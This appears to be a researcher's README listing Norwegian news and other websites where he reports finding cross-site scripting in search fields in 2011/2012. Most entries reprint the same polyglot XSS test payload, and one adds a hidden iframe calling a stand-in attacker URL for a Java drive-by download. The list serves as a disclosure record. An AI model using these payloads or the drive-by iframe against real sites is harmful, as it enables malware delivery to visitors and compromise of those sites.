# XSS-Vulnerability-List
List of websites that I have found Cross Site Scripting vulnerabilities over the years, 
which includes URLs of well known websites/brands. Considering the fact that most of
these vulnerabilities were found many years ago, I do not have a POC (Proof of Concept)
images for all of my discoveries. However, I do have records of emails I have sent and
exchanged with people involved with nearly all of the websites being listed below.
In other words, they should be able to confirm this, as the mail is probably logged
both in their system, including mine.

Please note that all of these discoveries was in the time of 2011/2012.

## VG.NO
I found this vulnerability back in 2012, where it was possible to inject HTML in their
search field on pretty much every website they had that allowed for a standard search.

Dork/Injection used: 
```
;alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

## DN.NO
XSS vulnerability in the search field.

Dork/Injection used: 
```
;alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

POC: (Will be updated).

## STARTSIDEN.NO
Another XSS vulnerability in the search field.

Dork/Injection used: 
```
;alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

POC: (Will be updated).

## AFTENPOSTEN.NO
Yet another XSS vulnerability in the search field.

Dork/Injection used: 
```
;alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

POC: (Will be updated).

## NKI.NO
XSS vulnerability in the search field, along with
the possibility to add more html content such as
new text on the website, as well as an iframe.
Pretty sketchy, due to the fact that you can link
directly to a Java drive-by and just encode the URL
and make it appear normal.

Dork/Injection used: 
```
;alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

and

```
<iframe src="attackerURL/javadriveBy" width="0" height="0">
```

POC: (Will be updated).

## NRK.NO
This vulnerability was also found back in 2012, and was also through the search field
on the website, including other sub-domains.

Dork/Injection used: 
```

```

POC: (Will be updated).

## TURISTFORENINGEN.NO
Found this simple cross site scripting vulnerability
back in 2011/2012 along with an extremely dangerous
blind SQL-injection vulnerability that allowed full
root access to their system. They fixed the bug
almost immediately, but their response was really
not that impressive. One word; ingratitude.

```
